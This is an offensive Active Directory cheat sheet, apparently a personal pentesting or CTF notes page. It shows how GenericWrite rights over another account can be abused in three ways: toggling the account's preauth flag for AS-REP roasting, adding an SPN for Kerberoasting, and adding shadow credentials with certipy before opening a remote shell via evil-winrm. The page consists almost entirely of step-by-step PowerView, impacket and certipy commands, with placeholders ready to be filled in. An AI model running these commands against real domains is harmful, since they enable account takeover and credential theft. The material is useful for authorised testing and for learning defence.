---
title: "GenericWrite"
date: 2024-7-13
tags: ["GenericWrite", "active driectory", "ad", "Windows"]
---

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Check target user

```console
Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
```

#### 3. Add UF_DONT_REQUIRE_PREAUTH bit

```console
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### 4. AS-REP Roasting

```console
# In local linux machine
impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
```

{{< /tabcontent >}}

---

### Abuse #2 : Kerberoasting by adding spn

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add a SPN

```console
# eg. MSSQLSvc/example.com:1433
setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
```

```console
# Check
Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
```

#### 4. Get SPN

```console
Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
```

{{< /tabcontent >}}

---

### Abuse #3: Add shadow credentials

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a ticket

```console
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
```

#### 2. Add shadow credentials

```console
export KRB5CCNAME=<USER>.ccache
```

```console
# Pre-check (Optional)
certipy-ad find -username '<USER>@<DOMAIN>' -k -target <TARGET_DOMAIN>
```

```console
# Add shadow credentials
certipy-ad shadow auto -username '<USER>@<DOMAIN'> -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

#### 3. Remote

```console
# Edit '/etc/krb5.conf' (All uppercase)
[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

<br>

```console
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console
evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

{{< /tabcontent >}}
